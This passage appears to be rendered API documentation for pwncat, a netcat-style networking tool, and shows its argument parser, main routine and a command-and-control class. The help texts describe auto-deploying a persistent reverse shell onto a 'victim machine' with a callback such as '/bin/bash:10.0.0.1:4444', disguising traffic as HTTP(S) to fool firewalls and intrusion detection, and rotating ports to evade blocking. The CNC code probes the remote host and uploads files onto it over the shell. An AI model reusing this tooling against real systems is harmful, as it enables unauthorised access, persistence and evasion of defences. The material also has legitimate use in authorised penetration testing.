    # TODO: add --crlf-i and --crlf-o to only do this on input or output and have
    # --crlf to always do it on input and output!
    optional.add_argument(
        &#34;-C&#34;,
        &#34;--crlf&#34;,
        type=_args_check_lf,
        metavar=&#34;lf&#34;,
        default=None,
        help=&#34;&#34;&#34;Specify, &#39;lf&#39;, &#39;crlf&#39; or &#39;cr&#39; to always force replacing
line endings for input and outout accordingly. Specify
&#39;no&#39; to completely remove any line feeds. By default
it will not replace anything and takes what is entered
(usually CRLF on Windows, LF on Linux and some times
CR on MacOS).&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-n&#34;, &#34;--nodns&#34;, action=&#34;store_true&#34;, default=False, help=&#34;Do not resolve DNS.&#34;,
    )
    optional.add_argument(
        &#34;-u&#34;,
        &#34;--udp&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;Use UDP for the connection instead of TCP.&#34;,
    )
    optional.add_argument(
        &#34;-T&#34;,
        &#34;--tos&#34;,
        metavar=&#34;str&#34;,
        default=None,
        type=_args_check_tos,
        help=&#34;&#34;&#34;Specifies IP Type of Service (ToS) for the connection.
Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
&#39;reliability&#39;, &#39;throughput&#39; or &#39;lowdelay&#39;.
&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-v&#34;,
        &#34;--verbose&#34;,
        action=&#34;count&#34;,
        default=0,
        help=&#34;&#34;&#34;Be verbose and print info to stderr. Use -v, -vv, -vvv
or -vvvv for more verbosity. The server performance will
decrease drastically if you use more than three times.&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;--info&#34;,
        metavar=&#34;type&#34;,
        default=&#34;&#34;,
        type=_args_check_info,
        help=&#34;&#34;&#34;Show additional info about sockets, ip4/6 or tcp opts
applied to the current socket connection. Valid
parameter are &#39;sock&#39;, &#39;ipv4&#39;, &#39;ipv6&#39;, &#39;tcp&#39; or &#39;all&#39;.
Note, you must at least be in INFO verbose mode in order
to see them (-vv).&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-c&#34;,
        &#34;--color&#34;,
        metavar=&#34;str&#34;,
        default=&#34;auto&#34;,
        type=_args_check_color,
        help=&#34;&#34;&#34;Colored log output. Specify &#39;always&#39;, &#39;never&#39; or &#39;auto&#39;.
In &#39;auto&#39; mode, color is displayed as long as the output
goes to a terminal. If it is piped into a file, color
will automatically be disabled. This mode also disables
color on Windows by default. (default: auto)
&#34;&#34;&#34;,
    )

    cnc.add_argument(
        &#34;--self-inject&#34;,
        metavar=&#34;cmd:host:port&#34;,
        default=None,
        type=_args_check_upload_myself,
        help=&#34;&#34;&#34;Listen mode (TCP only):
If you are about to inject a reverse shell onto the
victim machine (via php, bash, nc, ncat or similar),
start your listening server with this argument.
This will then (as soon as the reverse shell connects)
automatically deploy and background-run an unbreakable
pwncat reverse shell onto the victim machine which then
also connects back to you with specified arguments.
Example: &#39;--self-inject /bin/bash:10.0.0.1:4444&#39;
Note: this is currently an experimental feature and does
not work on Windows remote hosts yet.
&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--script-send&#34;,
        metavar=&#34;file&#34;,
        default=None,
        type=_args_check_script,
        help=&#34;&#34;&#34;All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed before
sending data to a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be &#39;transform&#39;
    # NOTE: the function param name must be &#39;data&#39;
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat&#39;s function or classes, as the
file will be called with exec().

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--script-recv&#34;,
        metavar=&#34;file&#34;,
        default=None,
        type=_args_check_script,
        help=&#34;&#34;&#34;All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed after
receiving data from a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be &#39;transform&#39;
    # NOTE: the function param name must be &#39;data&#39;
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat&#39;s function or classes, as the
file will be called with exec().

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--http&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect / Listen / Local forward mode (TCP only):
Hide traffic in http packets to fool Firewalls/IDS/IPS.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--https&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect / Listen / Local forward mode (TCP only):
Hide traffic in https packets to fool Firewalls/IDS/IPS.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;-k&#34;,
        &#34;--keep-open&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Listen mode (TCP only):
Re-accept new clients in listen mode after a client has
disconnected or the connection is unterrupted otherwise.
(default: server will quit after connection is gone)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind&#34;,
        metavar=&#34;x&#34;,
        nargs=&#34;?&#34;,
        default=0,
        type=int,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
If the server is unable to bind, it will re-initialize
itself x many times before giving up. Omit the
quantifier to rebind endlessly or specify a positive
integer for how many times to rebind before giving up.
See --rebind-robin for an interesting use-case.
(default: fail after first unsuccessful try).

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind-wait&#34;,
        metavar=&#34;s&#34;,
        default=1.0,
        type=float,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
Wait x seconds between re-initialization. (default: 1)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
If the server is unable to initialize (e.g: cannot bind
and --rebind is specified, it it will shuffle ports in
round-robin mode to bind to. Use comma separated string
such as &#39;80,81,82&#39; or a range of ports &#39;80-100&#39;.
Set --rebind to at least the number of ports to probe +1
This option requires --rebind to be specified.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn&#34;,
        metavar=&#34;x&#34;,
        nargs=&#34;?&#34;,
        default=0,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
If the remote server is not reachable or the connection
is interrupted, the client will connect again x many
times before giving up. Omit the quantifier to retry
endlessly or specify a positive integer for how many
times to retry before giving up.
(default: quit if the remote is not available or the
connection was interrupted)
This might be handy for stable TCP reverse shells ;-)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn-wait&#34;,
        metavar=&#34;s&#34;,
        default=1.0,
        type=float,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
Wait x seconds between re-connects. (default: 1)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
If the remote server is not reachable or the connection
is interrupted and --reconn is specified, the client
will shuffle ports in round-robin mode to connect to.
Use comma separated string such as &#39;80,81,82&#39; or a range
of ports &#39;80-100&#39;.
Set --reconn to at least the number of ports to probe +1
This helps reverse shell to evade intrusiona prevention
systems that will cut your connection and block the
outbound port.
This is also useful in Connect or Zero-I/O mode to
figure out what outbound ports are allowed.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;-w&#34;,
        &#34;--wait&#34;,
        metavar=&#34;s&#34;,
        default=False,
        type=int,
        help=&#34;&#34;&#34;Connect mode (TCP only):
If a connection and stdin are idle for more than s sec,
then the connection is silently closed and the client
will exit. (default: wait forever).
Note: if --reconn is specified, the connection will be
re-opened.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-init&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
UDP is a stateless protocol unlike TCP, so no hand-
shake communication takes place and the client just
sends data to a server without being &#34;accepted&#34; by
the server first.
This means a server waiting for an UDP client to
connect to, is unable to send any data to the client,
before the client hasn&#39;t send data first. The server
simply doesn&#39;t know the IP address before an initial
connect.
The --ping-init option instructs the client to send one
single initial ping packet to the server, so that it is
able to talk to the client.
This is the only way to make a UDP reverse shell work.
See --ping-word for what char/string to send as initial
ping packet (default: &#39;\\0&#39;)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-intvl&#34;,
        metavar=&#34;s&#34;,
        default=False,
        type=int,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Instruct the client to send ping intervalls every s sec.
This allows you to restart your UDP server and just wait
for the client to report back in. This might be handy
for stable UDP reverse shells ;-)
See --ping-word for what char/string to send as initial
ping packet (default: &#39;\\0&#39;)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-word&#34;,
        metavar=&#34;str&#34;,
        default=&#34;\0&#34;,
        type=str,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Change the default character &#39;\\0&#39; to use for upd ping.
Single character or strings are supported.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Instruct the client to shuffle the specified ports in
round-robin mode for a remote server to ping.
This might be handy to scan outbound allowed ports.
Use --ping-intvl 0 to be faster.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--safe-word&#34;,
        metavar=&#34;str&#34;,
        default=False,
        type=str,
        help=&#34;&#34;&#34;All modes:
If %(prog)s is started with this argument, it will shut
down as soon as it receives the specified string. The
--keep-open (server) or --reconn (client) options will
be ignored and it won&#39;t listen again or reconnect to you.
Use a very unique string to not have it shut down
accidentally by other input.
&#34;&#34;&#34;
        % ({&#34;prog&#34;: APPNAME}),
    )
    misc.add_argument(&#34;-h&#34;, &#34;--help&#34;, action=&#34;help&#34;, help=&#34;Show this help message and exit&#34;)
    misc.add_argument(
        &#34;-V&#34;,
        &#34;--version&#34;,
        action=&#34;version&#34;,
        version=get_version(),
        help=&#34;Show version information and exit&#34;,
    )

    # Retrieve arguments
    args = parser.parse_args()

    # Check mutually exclive arguments
    _args_check_mutually_exclusive(parser, args)

    # Connect mode and Zero-I/O mode require hostname and port to be set
    connect_mode = not (args.listen or args.zero or args.local or args.remote)
    if (connect_mode or args.zero) and not args.hostname:
        parser.print_usage()
        print(
            &#34;%s: error: the following arguments are required: hostname&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Deny unimplemented modes
    if args.http or args.https or args.rebind or args.wait or args.ping_init or args.safe_word:
        print(&#34;Unimplemented options&#34;, file=sys.stderr)
        sys.exit(1)

    return args</code></pre>
</details>
</dd>
<dt id="pwncat.get_version"><code class="name flex">
<span>def <span class="ident">get_version</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"><p>Return version information.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_version():
    # type: () -&gt; str
    &#34;&#34;&#34;Return version information.&#34;&#34;&#34;
    return &#34;&#34;&#34;%(prog)s: Version %(version)s (%(url)s) by %(author)s&#34;&#34;&#34; % (
        {&#34;prog&#34;: APPNAME, &#34;version&#34;: VERSION, &#34;url&#34;: APPREPO, &#34;author&#34;: &#34;cytopia&#34;}
    )</code></pre>
</details>
</dd>
<dt id="pwncat.main"><code class="name flex">
<span>def <span class="ident">main</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"><p>Run the program.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def main():
    # type: () -&gt; None
    &#34;&#34;&#34;Run the program.&#34;&#34;&#34;
    args = get_args()
    host = args.hostname
    ports = [args.port]

    reconn = -1 if args.reconn is None else args.reconn
    rebind = -1 if args.rebind is None else args.rebind

    # Set pwncat options
    sock_opts = DsIONetworkSock(
        RECV_BUFSIZE,
        LISTEN_BACKLOG,
        TIMEOUT_RECV_SOCKET,
        TIMEOUT_RECV_SOCKET_RETRY,
        args.nodns,
        args.ipv6,
        args.udp,
        args.tos,
        args.info,
    )
    srv_opts = DsIONetworkSrv(args.keep_open, rebind, args.rebind_wait, args.rebind_robin)
    cli_opts = DsIONetworkCli(reconn, args.reconn_wait, args.reconn_robin)
    # TODO:
    # &#34;wait&#34;: args.wait,
    # &#34;ping_init&#34;: args.ping_init,
    # &#34;ping_intvl&#34;: args.ping_intvl,
    # &#34;ping_word&#34;: args.ping_word,
    # &#34;ping_robing&#34;: args.ping_robin,
    # &#34;safe_word&#34;: args.safe_word,

    # Map pwncat verbosity to Python&#39;s Logger loglevel
    logmap = {
        0: logging.ERROR,
        1: logging.WARNING,
        2: logging.INFO,
        3: logging.DEBUG,
    }
    loglevel = logmap.get(args.verbose, TraceLogger.LEVEL_NUM)

    # Use a colored log formatter
    formatter = ColoredLogFormatter(args.color, loglevel)
    handler = logging.StreamHandler()
    handler.setLevel(loglevel)
    handler.setFormatter(formatter)

    # Use a custom logger with TRACE level
    logging.setLoggerClass(TraceLogger)
    logger = logging.getLogger(__name__)
    logger.setLevel(loglevel)
    logger.addHandler(handler)

    # Initialize encoder
    enc = StringEncoder()

    # Initialize StopSignal
    ssig = StopSignal()

    # Initialize transformers
    transformers = []
    if args.crlf is not None:
        transformers.append(TransformLinefeed(DsTransformLinefeed(args.crlf)))

    # Initialize scripting engine transformers
    code_send = None
    code_recv = None
    if args.script_send is not None:
        code_send = compile(args.script_send, &#34;&lt;script-send&gt;&#34;, &#34;exec&#34;)
    if args.script_recv is not None:
        code_recv = compile(args.script_recv, &#34;&lt;script-recv&gt;&#34;, &#34;exec&#34;)

    # Use command modulde
    if args.cmd:
        mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
    # Use output module
    else:
        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN))

    # Run local port-forward
    # -&gt; listen locally and forward traffic to remote (connect)
    if args.local:
        # TODO: Make the listen address optional!
        srv_opts.keep_open = True
        lhost = args.local.split(&#34;:&#34;)[0]
        lport = int(args.local.split(&#34;:&#34;)[1])
        # Create listen and client instances
        net_srv = IONetwork(ssig, enc, lhost, [lport], &#34;server&#34;, srv_opts, cli_opts, sock_opts)
        net_cli = IONetwork(ssig, enc, host, ports, &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(PSEStore(ssig, [net_srv, net_cli]))
        run.add_action(
            &#34;TRANSMIT&#34;,
            DsRunnerAction(
                net_srv.producer,  # (receive) USER sends data to PC-SERVER
                net_cli.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                None,
            ),
        )
        run.add_action(
            &#34;RECEIVE&#34;,
            DsRunnerAction(
                net_cli.producer,  # (receive) Data comes back from TARGET to PC-CLIENT
                net_srv.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                None,
            ),
        )
        run.run()
    # Run remote port-forward
    # -&gt; connect to client, connect to target and proxy traffic in between.
    if args.remote:
        # TODO: Make the listen address optional!
        cli_opts.reconn = -1
        cli_opts.reconn_wait = 0.1
        lhost = args.remote.split(&#34;:&#34;)[0]
        lport = int(args.remote.split(&#34;:&#34;)[1])
        # Create local and remote client
        net_cli_l = IONetwork(ssig, enc, lhost, [lport], &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        net_cli_r = IONetwork(ssig, enc, host, ports, &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(PSEStore(ssig, [net_cli_l, net_cli_r]))
        run.add_action(
            &#34;TRANSMIT&#34;,
            DsRunnerAction(
                net_cli_l.producer,  # (receive) USER sends data to PC-SERVER
                net_cli_r.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [],
                transformers,
                None,
            ),
        )
        run.add_action(
            &#34;RECEIVE&#34;,
            DsRunnerAction(
                net_cli_r.producer,  # (receive) Data comes back from TARGET to PC-CLIENT
                net_cli_l.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [],
                transformers,
                None,
            ),
        )
        run.run()
    # Run server
    if args.listen:
        net = IONetwork(ssig, enc, host, ports, &#34;server&#34;, srv_opts, cli_opts, sock_opts)
        # Run blocking auto-deploy.
        # This will hand over to normal listening server on success or failure
        if args.self_inject:
            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
        run = Runner(PSEStore(ssig, [net]))
        run.add_action(
            &#34;RECV&#34;,
            DsRunnerAction(
                net.producer,  # receive data
                mod.consumer,
                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
                transformers,
                code_recv,
            ),
        )
        run.add_action(
            &#34;STDIN&#34;,
            DsRunnerAction(
                mod.producer,
                net.consumer,  # send data
                [mod.interrupt],  # Externally stop the produer itself
                transformers,
                code_send,
            ),
        )
        run.run()

    # Run client
    else:
        net = IONetwork(
            ssig, enc, host, ports + args.reconn_robin, &#34;client&#34;, srv_opts, cli_opts, sock_opts
        )
        run = Runner(PSEStore(ssig, [net]))
        run.add_action(
            &#34;RECV&#34;,
            DsRunnerAction(
                net.producer,  # receive data
                mod.consumer,
                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
                transformers,
                code_recv,
            ),
        )
        run.add_action(
            &#34;STDIN&#34;,
            DsRunnerAction(
                mod.producer,
                net.consumer,  # send data
                [net.interrupt, mod.interrupt],  # Externally stop the produer itself
                transformers,
                code_send,
            ),
        )
        if type(args.ping_intvl) is int and args.ping_intvl &gt; 0:
            run.add_timer(
                &#34;PING&#34;,
                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (args.ping_word)),  # send data
            )
        run.run()</code></pre>
</details>
</dd>
</dl>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="pwncat.CNC"><code class="flex name class">
<span>class <span class="ident">CNC</span></span>
<span>(</span><span>enc, fsend, frecv)</span>
</code></dt>
<dd>
<div class="desc"><p>Command and Control base class.</p>
<p>Instantiate Command and Control class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>enc</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
<dt><strong><code>fsend</code></strong> :&ensp;<code>func</code></dt>
<dd>Socket send function.</dd>
<dt><strong><code>frcev</code></strong> :&ensp;<code>func</code></dt>
<dd>Socket receive generator function.</dd>
</dl>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>FileNotFoundError</code></dt>
<dd>if remote Python binary path is not found.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class CNC(object):
    &#34;&#34;&#34;Command and Control base class.&#34;&#34;&#34;

    __PYTHON_PATHS = [
        &#34;/bin&#34;,
        &#34;/usr/bin&#34;,
        &#34;/usr/local/bin&#34;,
        &#34;/usr/local/python/bin&#34;,
        &#34;/usr/local/python2/bin&#34;,
        &#34;/usr/local/python2.7/bin&#34;,
        &#34;/usr/local/python3/bin&#34;,
        &#34;/usr/local/python3.5/bin&#34;,
        &#34;/usr/local/python3.6/bin&#34;,
        &#34;/usr/local/python3.7/bin&#34;,
        &#34;/usr/local/python3.8/bin&#34;,
        &#34;/opt/bin&#34;,
        &#34;/opt/python/bin&#34;,
        &#34;/opt/python2/bin&#34;,
        &#34;/opt/python2.7/bin&#34;,
        &#34;/opt/python3/bin&#34;,
        &#34;/opt/python3.5/bin&#34;,
        &#34;/opt/python3.6/bin&#34;,
        &#34;/opt/python3.7/bin&#34;,
        &#34;/opt/python3.8/bin&#34;,
    ]

    __PYTHON_VERSIONS = [
        &#34;python&#34;,
        &#34;python2&#34;,
        &#34;python2.7&#34;,
        &#34;python3&#34;,
        &#34;python3.5&#34;,
        &#34;python3.6&#34;,
        &#34;python3.7&#34;,
        &#34;python3.8&#34;,
    ]

    __COLORS = {&#34;yellow&#34;: &#34;\x1b[33;21m&#34;, &#34;reset&#34;: &#34;\x1b[0m&#34;}

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def python(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
        return self.__python

    @property
    def py3(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
        return self.__py3

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, enc, fsend, frecv):
        # type: (StringEncoder, Callable[[str], None], Callable[[], Iterator[str]]) -&gt; None
        &#34;&#34;&#34;Instantiate Command and Control class.

        Args:
            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            fsend (func): Socket send function.
            frcev (func): Socket receive generator function.

        Raises:
            FileNotFoundError: if remote Python binary path is not found.
        &#34;&#34;&#34;
        self.__enc = enc
        self.__fsend = fsend
        self.__frecv = frecv

        if not self.__set_remote_python_path():
            self.print_info(&#34;No Python has been found. Aborting and handing over to current shell.&#34;)
            raise FileNotFoundError()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def print_info(self, message=None, newline=True, erase=False):
        # type: (Optional[str], bool, bool) -&gt; None
        &#34;&#34;&#34;Print a message to the local screen to inform the user.

        Args:
            message (str): The message to print.
            newline (bool): Add a newline?
            erase (bool): Erase previously printed text on the same line.
        &#34;&#34;&#34;
        end = &#34;\n&#34; if newline else &#34;&#34;
        prefix = &#34;{}[PWNCAT CnC]{} &#34;.format(self.__COLORS[&#34;yellow&#34;], self.__COLORS[&#34;reset&#34;])
        if message is None:
            message = &#34;&#34;
            prefix = &#34;&#34;

        if erase:
            print(&#34;\r&#34; * 1024 + &#34;{}{}&#34;.format(prefix, message), end=end)
            sys.stdout.flush()
        else:
            print(&#34;{}{}&#34;.format(prefix, message), end=end)
            sys.stdout.flush()

    def remote_command(self, command):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Run remote command with correct linefeeds.

        Args:
            command (str): The command to execute on the remote end.
        &#34;&#34;&#34;
        # TODO: determine remote host line feeds and set accordingly.
        self.__fsend(command + &#34;\n&#34;)

    def create_remote_tmpfile(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;OS-independent remote tempfile creation.

        Returns:
            str or None: Returns path on success or None on error.
        &#34;&#34;&#34;
        command = []
        command.append(&#34;{} -c &#39;&#34;.format(self.__python))
        command.append(&#34;import tempfile;&#34;)
        command.append(&#34;h,f=tempfile.mkstemp();&#34;)
        if self.__py3:
            command.append(&#34;print(f);&#34;)
        else:
            command.append(&#34;print f;&#34;)
        command.append(&#34;&#39;&#34;)
        self.remote_command(&#34;&#34;.join(command))

        self.print_info(&#34;Creating tmpfile:&#34;, False, True)
        for response in self.__frecv():
            if response:
                tmpfile = response.rstrip()
                self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
                return tmpfile

        self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
        return None

    def upload(self, lpath, rpath):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;OS-independent upload of a local file to a remote path.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        assert self.__python is not None
        assert self.__py3 is not None

        rpath_b64 = self.create_remote_tmpfile()
        if rpath_b64 is None:
            return False
        if not self.__upload_file_base_64_encoded(lpath, rpath_b64):
            return False
        if not self.__remote_base64_decode(rpath_b64, rpath):
            return False
        return True

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_remote_python_path(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Enumerate remote Python binary.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # TODO: Make windows compatible
        for path in self.__PYTHON_PATHS:
            for version in self.__PYTHON_VERSIONS:
                python = path + &#34;/&#34; + version
                self.print_info(&#34;Probing for: {}&#34;.format(python))
                self.remote_command(&#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python))
                for response in self.__frecv():
                    reg = re.search(r&#34;^([.0-9]+)&#34;, response)
                    if response.rstrip() == python.rstrip():
                        self.print_info(&#34;Potential path: {}&#34;.format(python))
                        command = []
                        command.append(&#34;{} -c &#39;&#34;.format(python))
                        command.append(&#34;from __future__ import print_function;&#34;)
                        command.append(&#34;import sys;&#34;)
                        command.append(&#34;v=sys.version_info;&#34;)
                        command.append(&#39;print(&#34;{}.{}.{}&#34;.format(v[0], v[1], v[2]));\&#39;&#39;)
                        data = &#34;&#34;.join(command)
                        self.remote_command(data)
                        continue
                    if reg:
                        match = reg.group(1)
                        if match[0] == &#34;2&#34;:
                            self.__py3 = False
                        elif match[0] == &#34;3&#34;:
                            self.__py3 = True
                        else:
                            self.print_info(
                                &#34;Could not determine major version: {}&#34;.format(reg.group(1))
                            )
                            return False
                        self.print_info(&#34;Found valid Python{} version: {}&#34;.format(match[0], match))
                        self.__python = python
                        return True
                    # Nothing matched, break the innter loop
                    break
        return False

    def __upload_file_base_64_encoded(self, lpath, rpath):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;Upload a local file to a base64 encoded remote file.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        first = True
        with open(lpath, &#34;r&#34;) as fhandle:
            lines = fhandle.readlines()
            count = len(lines)
            curr = 1
            for line in lines:
                self.print_info(
                    &#34;Uploading: {} -&gt; {} ({}/{})&#34;.format(lpath, rpath, curr, count), False, True
                )
                b64 = self.__enc.base64_encode(line)
                if first:
                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath))
                    first = False
                else:
                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath))
                curr += 1
        self.print_info()
        # TODO: md5 check if this is legit
        return True

    def __remote_base64_decode(self, rpath_source, rpath_target):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;Decode a remote base64 encoded file with pure Python.

        Args:
            rpath_source (str): The remote path to the existing base64 encoded file.
            rpath_target (str): The remote path to the desired base64 decoded file.

        Returns:
            bool: Returns `True` on success or `False` on failure.
        &#34;&#34;&#34;
        command = []
        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__python))
        command.append(&#39;f=open(&#34;{}&#34;, &#34;r&#34;);&#39;.format(rpath_source))
        command.append(&#34;lines = f.readlines();&#34;)
        if self.__py3:
            command.append(&#39;print(&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines]));\&#39;&#39;)
        else:
            command.append(&#39;print &#34;&#34;.join([base64.b64decode(l) for l in lines]);\&#39;&#39;)
        command.append(&#34;&gt; {}&#34;.format(rpath_target))

        self.print_info(&#34;Decoding: {} -&gt; {}&#34;.format(rpath_source, rpath_target))
        self.remote_command(&#34;&#34;.join(command))
        # TODO: validate via md5
        return True</code></pre>
</details>
<h3>Subclasses</h3>
<ul class="hlist">
<li><a title="pwncat.CNCAutoDeploy" href="#pwncat.CNCAutoDeploy">CNCAutoDeploy</a></li>
</ul>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.CNC.py3"><code class="name">var <span class="ident">py3</span></code></dt>
<dd>
<div class="desc"><p>Is remote version Python3? Else it is Python2.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def py3(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
    return self.__py3</code></pre>
</details>
</dd>
<dt id="pwncat.CNC.python"><code class="name">var <span class="ident">python</span></code></dt>
<dd>
<div class="desc"><p>Discovered absolute Python remote path.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def python(self):
    # type: () -&gt; str
    &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
    return self.__python</code></pre>
</details>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.CNC.create_remote_tmpfile"><code class="name flex">
<span>def <span class="ident">create_remote_tmpfile</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>OS-independent remote tempfile creation.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code> or <code>None</code></dt>
<dd>Returns path on success or None on error.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def create_remote_tmpfile(self):
    # type: () -&gt; Optional[str]
    &#34;&#34;&#34;OS-independent remote tempfile creation.

    Returns:
        str or None: Returns path on success or None on error.
    &#34;&#34;&#34;
    command = []
    command.append(&#34;{} -c &#39;&#34;.format(self.__python))
    command.append(&#34;import tempfile;&#34;)
    command.append(&#34;h,f=tempfile.mkstemp();&#34;)
    if self.__py3:
        command.append(&#34;print(f);&#34;)
    else:
        command.append(&#34;print f;&#34;)
    command.append(&#34;&#39;&#34;)
    self.remote_command(&#34;&#34;.join(command))

